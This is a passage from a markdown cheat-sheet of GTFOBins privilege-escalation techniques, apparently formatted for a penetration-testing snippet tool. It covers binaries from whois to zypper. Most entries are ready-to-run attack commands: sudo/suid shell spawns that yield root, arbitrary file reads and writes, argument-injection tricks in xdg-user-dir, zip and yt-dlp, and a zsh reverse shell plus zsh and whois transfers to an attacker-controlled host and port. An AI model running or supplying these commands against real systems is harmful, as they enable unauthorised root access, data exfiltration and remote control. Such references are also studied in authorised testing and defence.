```sh title:"GTFOBins Download Whois Download (whois download (sudo / suid / unprivileged)"
whois -h $lhost -p $lport x
```
<!-- cheat
import tun_ip
import lports
-->

### whois upload

Upload whois upload with the Gtfobins GTFOBins technique.

Data is converted to lower case, and has a trailing `\r\n`.

```sh title:"GTFOBins Upload Whois Upload (whois upload (sudo / suid / unprivileged)"
whois -h $lhost -p $lport $data
```
<!-- cheat
import tun_ip
import lports
var data
-->

## wireshark

### wireshark file-write

Write wireshark file write with the Gtfobins GTFOBins technique.

This technique can be used to write arbitrary files, i.e., the dump of one UDP packet.  After starting Wireshark, and waiting for the capture to begin, deliver the UDP packet, e.g., with `nc` (see below). The capture then stops and the packet dump can be saved:  1. select the only received packet;  2. right-click on "Data" from the "Packet Details" pane, and select "Export Packet Bytes...";  3. choose where to save the packet dump.

```sh title:"GTFOBins Write Wireshark File Write (wireshark file write (sudo / unprivileged)"
wireshark -c 1 -i lo -k -f 'udp port $lport' &
echo $data | nc -u 127.127.127.127 $lport
```
<!-- cheat
import lports
var data
-->

### wireshark inherit (inherits from lua)

Run wireshark inherit (inherits from lua) with the Gtfobins GTFOBins technique.

This requires GUI interaction. Start Wireshark, then from the main menu, select "Tools" -> "Lua" -> "Evaluate". A window opens that allows to execute Lua code.

```sh title:"GTFOBins Run Wireshark Inherit (inherits from Lua) (wireshark inherit from lua (sudo / unprivileged)"
wireshark
```
<!-- cheat
-->

## wish

### wish inherit (inherits from tclsh)

Run wish inherit (inherits from tclsh) with the Gtfobins GTFOBins technique.

Inherit the capabilities of another binary by invoking it.

```sh title:"GTFOBins Run Wish Inherit (inherits from Tclsh) (wish inherit from tclsh (sudo / suid / unprivileged)"
wish
```
<!-- cheat
-->

## xargs

### xargs shell #1

Spawn xargs shell #1 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Xargs Shell #1 (xargs shell (sudo / suid / unprivileged)"
xargs -a /dev/null /bin/sh
```
<!-- cheat
-->

#### xargs shell #1 - suid override
Spawn xargs shell #1 with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Xargs Shell #1 (xargs shell (suid variant)"
xargs -a /dev/null /bin/sh -p
```
<!-- cheat
-->

### xargs shell #2

Spawn xargs shell #2 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Xargs Shell #2 (xargs shell (sudo / suid / unprivileged)"
xargs -a /dev/null /bin/sh
```
<!-- cheat
-->

#### xargs shell #2 - suid override
Spawn xargs shell #2 with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Xargs Shell #2 (xargs shell (suid variant)"
xargs -a /dev/null /bin/sh -p
```
<!-- cheat
-->

### xargs shell #3

Spawn xargs shell #3 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Xargs Shell #3 (xargs shell (sudo / suid / unprivileged)"
echo x | xargs -o -a /dev/null /bin/sh
```
<!-- cheat
-->

#### xargs shell #3 - suid override
Spawn xargs shell #3 with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Xargs Shell #3 (xargs shell (suid variant)"
echo x | xargs -o -a /dev/null /bin/sh -p
```
<!-- cheat
-->

### xargs file-read

Read xargs file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Xargs File Read (xargs file read (sudo / suid / unprivileged)"
xargs -a $file_in -0
```
<!-- cheat
var file_in
-->

## xdg-user-dir

The current implementation of `xdg-user-dir` is basically `eval echo \${XDG_${1}_DIR:-$HOME}`, thus is can be easily used to achieve command execution.

### xdg-user-dir shell

Spawn xdg user dir shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Xdg User Dir Shell (xdg-user-dir shell (sudo / unprivileged)"
xdg-user-dir '}; /bin/sh #'
```
<!-- cheat
-->

## xdotool

This requires a running X server.

### xdotool shell

Spawn xdotool shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Xdotool Shell (xdotool shell (sudo / suid / unprivileged)"
xdotool exec --sync /bin/sh
```
<!-- cheat
-->

#### xdotool shell - suid override
Spawn xdotool shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Xdotool Shell (xdotool shell (suid variant)"
xdotool exec --sync /bin/sh -p
```
<!-- cheat
-->

## xelatex

Alias of [latex](#latex). All techniques from `latex` apply.

## xetex

Alias of [tex](#tex). All techniques from `tex` apply.

## xmodmap

This requires a running X server.

### xmodmap file-read

Read xmodmap file read with the Gtfobins GTFOBins technique.

The read file content is corrupted by error prints.

```sh title:"GTFOBins Read Xmodmap File Read (xmodmap file read (sudo / suid / unprivileged)"
xmodmap -v $file_in
```
<!-- cheat
var file_in
-->

## xmore

This requires a running X server.

### xmore file-read

Read xmore file read with the Gtfobins GTFOBins technique.

The file is displayed in a graphical window.

```sh title:"GTFOBins Read Xmore File Read (xmore file read (sudo / suid / unprivileged)"
xmore $file_in
```
<!-- cheat
var file_in
-->

## xpad

This requires a running X server.

### xpad file-read

Read xpad file read with the Gtfobins GTFOBins technique.

The file is displayed in a graphical window.

```sh title:"GTFOBins Read Xpad File Read (xpad file read (sudo / suid / unprivileged)"
xpad -f $file_in
```
<!-- cheat
var file_in
-->

## xxd

### xxd file-read

Read xxd file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Xxd File Read (xxd file read (sudo / suid / unprivileged)"
xxd $file_in | xxd -r
```
<!-- cheat
var file_in
-->

### xxd file-write

Write xxd file write with the Gtfobins GTFOBins technique.

Write attacker-controlled data to an arbitrary path.

```sh title:"GTFOBins Write Xxd File Write (xxd file write (sudo / suid / unprivileged)"
echo $data | xxd | xxd -r - $file_out
```
<!-- cheat
var data
var file_out
-->

## xz

### xz file-read

Read xz file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Xz File Read (xz file read (sudo / suid / unprivileged)"
xz -c $file_in | xz -d
```
<!-- cheat
var file_in
-->

## yarn

### yarn shell #1

Spawn yarn shell #1 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Yarn Shell #1 (yarn shell (sudo / unprivileged)"
yarn exec /bin/sh
```
<!-- cheat
-->

### yarn shell #2

Spawn yarn shell #2 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Yarn Shell #2 (yarn shell (sudo / unprivileged)"
echo '{"scripts": {"preinstall": "/bin/sh"}}' >package.json
yarn --cwd .
```
<!-- cheat
-->

### yarn shell #3

Spawn yarn shell #3 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Yarn Shell #3 (yarn shell (sudo / unprivileged)"
echo '{"scripts": {"xxx": "/bin/sh"}}' >package.json
yarn --cwd . xxx
```
<!-- cheat
-->

## yash

### yash shell

Spawn yash shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Yash Shell (yash shell (sudo / suid / unprivileged)"
yash
```
<!-- cheat
-->

## yelp

### yelp file-read

Read yelp file read with the Gtfobins GTFOBins technique.

This spawns a graphical window containing the file content somehow corrupted by word wrapping.

```sh title:"GTFOBins Read Yelp File Read (yelp file read (sudo / unprivileged)"
yelp man:$file_in
```
<!-- cheat
var file_in
-->

## yt-dlp

### yt-dlp shell

Spawn yt dlp shell with the Gtfobins GTFOBins technique.

The URL must point to a valid YouTube video which will be actually downloaded.

```sh title:"GTFOBins Spawn Yt Dlp Shell (yt-dlp shell (sudo / unprivileged)"
yt-dlp 'https://www.youtube.com/watch?v=xxxxxxxxxxx' --exec '/bin/sh #'
```
<!-- cheat
-->

## yum

### yum command

Execute yum command with the Gtfobins GTFOBins technique.

Generate the RPM package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.  ``` echo $cmd_file >x.sh fpm -n x -s dir -t rpm -a all --before-install .x.sh . ```

```sh title:"GTFOBins Execute Yum Command (yum command (sudo)"
yum localinstall -y x-1.0-1.noarch.rpm
```
<!-- cheat
-->

### yum download

Download yum download with the Gtfobins GTFOBins technique.

The file on the remote host must have the `.rpm` extension, but the content does not have to be an RPM file. The file will be downloaded to a randomly created directory in `/var/tmp/yum-root-xxxxxx/`.

```sh title:"GTFOBins Download Yum Download (yum download (sudo)"
yum install $scheme://$lhost$file_in.rpm
```
<!-- cheat
import tun_ip
import scheme
var file_in
-->

### yum inherit (inherits from python)

Run yum inherit (inherits from python) with the Gtfobins GTFOBins technique.

This allows to run Python code (`...`).

```sh title:"GTFOBins Run Yum Inherit (inherits from Python) (yum inherit from python (sudo)"
cat >$tmp_dir/x<<EOF
[main]
plugins=1
pluginpath=$tmp_dir/
pluginconfpath=$tmp_dir/
EOF

cat >$tmp_dir/y.conf<<EOF
[main]
enabled=1
EOF

cat >$tmp_dir/y.py<<EOF
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  ...
EOF

yum -c $tmp_dir/x --enableplugin=y
```
<!-- cheat
var tmp_dir
-->

## zathura

This requires a running X server.

### zathura shell

Spawn zathura shell with the Gtfobins GTFOBins technique.

The interaction happens in a GUI window, while the shell is dropped in the terminal.

```sh title:"GTFOBins Spawn Zathura Shell (zathura shell (sudo / unprivileged)"
zathura
:! /bin/sh -c 'exec /bin/sh 0<&1'
```
<!-- cheat
-->

## zcat

### zcat file-read

Read zcat file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Zcat File Read (zcat file read (sudo / unprivileged)"
zcat -f $file_in
```
<!-- cheat
var file_in
-->

## zgrep

### zgrep file-read

Read zgrep file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Zgrep File Read (zgrep file read (sudo / unprivileged)"
grep '' $file_in
```
<!-- cheat
var file_in
-->

## zic

### zic command

Execute zic command with the Gtfobins GTFOBins technique.

This executes the command twice:  - `$cmd_file 0 xxx` - `$cmd_file 1 xxx`  Additionally the `Test` file is created.

```sh title:"GTFOBins Execute Zic Command (zic command (sudo / suid / unprivileged)"
echo 'Rule Jordan 0 1 xxx Jan lastSun 2 1:00d -' >$tmp_file
echo 'Zone Test 2:00 Jordan CE%sT' >>$tmp_file
zic -d . -y $cmd_file $tmp_file
```
<!-- cheat
var cmd_file
var tmp_file
-->

## zip

### zip shell

Spawn zip shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Zip Shell (zip shell (sudo / suid / unprivileged)"
zip $tmp_file /etc/hosts -T -TT '/bin/sh #'
```
<!-- cheat
var tmp_file
-->

### zip file-read

Read zip file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Zip File Read (zip file read (sudo / suid / unprivileged)"
zip $tmp_file $file_in
unzip -p $tmp_file
```
<!-- cheat
var file_in
var tmp_file
-->

## zless

### zless inherit (inherits from less)

Run zless inherit (inherits from less) with the Gtfobins GTFOBins technique.

Inherit the capabilities of another binary by invoking it.

```sh title:"GTFOBins Run Zless Inherit (inherits from Less) (zless inherit from less (sudo / suid / unprivileged)"
zless $file_in
```
<!-- cheat
var file_in
-->

## zsh

### zsh shell

Spawn zsh shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Zsh Shell (zsh shell (sudo / suid / unprivileged)"
zsh
```
<!-- cheat
-->

### zsh reverse-shell

Start zsh reverse shell with the Gtfobins GTFOBins technique.

Connect back to an attacker-controlled listener.

```sh title:"GTFOBins Start Zsh Reverse Shell (zsh reverse shell (sudo / suid / unprivileged)"
zsh -c 'zmodload zsh/net/tcp;ztcp $lhost $lport;zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
```
<!-- cheat
import tun_ip
import lports
-->

### zsh file-read #1

Read zsh file read #1 with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Zsh File Read #1 (zsh file read (sudo / suid / unprivileged)"
zsh -c 'echo "$(<$file_in)"'
```
<!-- cheat
var file_in
-->

### zsh file-read #2

Read zsh file read #2 with the Gtfobins GTFOBins technique.

This spawns a pager if run in a TTY.

```sh title:"GTFOBins Read Zsh File Read #2 (zsh file read (sudo / suid / unprivileged)"
zsh -c '<$file_in'
```
<!-- cheat
var file_in
-->

### zsh file-write

Write zsh file write with the Gtfobins GTFOBins technique.

Write attacker-controlled data to an arbitrary path.

```sh title:"GTFOBins Write Zsh File Write (zsh file write (sudo / suid / unprivileged)"
zsh -c 'echo $data >$file_out'
```
<!-- cheat
var data
var file_out
-->

### zsh download

Download zsh download with the Gtfobins GTFOBins technique.

Pull a remote file to disk.

```sh title:"GTFOBins Download Zsh Download (zsh download (sudo / suid / unprivileged)"
zsh -c 'zmodload zsh/net/tcp;ztcp $lhost $lport;echo -n "$(<&$REPLY)" >$file_out'
```
<!-- cheat
import tun_ip
import lports
var file_out
-->

### zsh upload

Upload zsh upload with the Gtfobins GTFOBins technique.

Push a local file to a remote receiver.

```sh title:"GTFOBins Upload Zsh Upload (zsh upload (sudo / suid / unprivileged)"
zsh -c 'zmodload zsh/net/tcp;ztcp $lhost $lport;echo -n "$(<$file_in)" >&$REPLY'
```
<!-- cheat
import tun_ip
import lports
var file_in
-->

### zsh inherit (inherits from less)

Run zsh inherit (inherits from less) with the Gtfobins GTFOBins technique.

Inherit the capabilities of another binary by invoking it.

```sh title:"GTFOBins Run Zsh Inherit (inherits from Less) (zsh inherit from less (sudo / suid / unprivileged)"
zsh -c '</etc/hosts'
```
<!-- cheat
-->

## zsoelim

### zsoelim file-read

Read zsoelim file read with the Gtfobins GTFOBins technique.

The content is actually parsed and corrupted by the command.

```sh title:"GTFOBins Read Zsoelim File Read (zsoelim file read (sudo / suid / unprivileged)"
zsoelim $file_in
```
<!-- cheat
var file_in
-->

## zypper

### zypper shell #1

Spawn zypper shell #1 with the Gtfobins GTFOBins technique.

The copy usually requires elevated privileges.

```sh title:"GTFOBins Spawn Zypper Shell #1 (zypper shell (sudo / unprivileged)"
cp /bin/sh /usr/lib/zypper/commands/zypper-x
zypper x
```
<!-- cheat
-->

### zypper shell #2

Spawn zypper shell #2 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Zypper Shell #2 (zypper shell (sudo / unprivileged)"
cp /bin/sh $tmp_dir/zypper-x
PATH=$PATH:$tmp_dir/ zypper x
```
<!-- cheat
var tmp_dir
-->
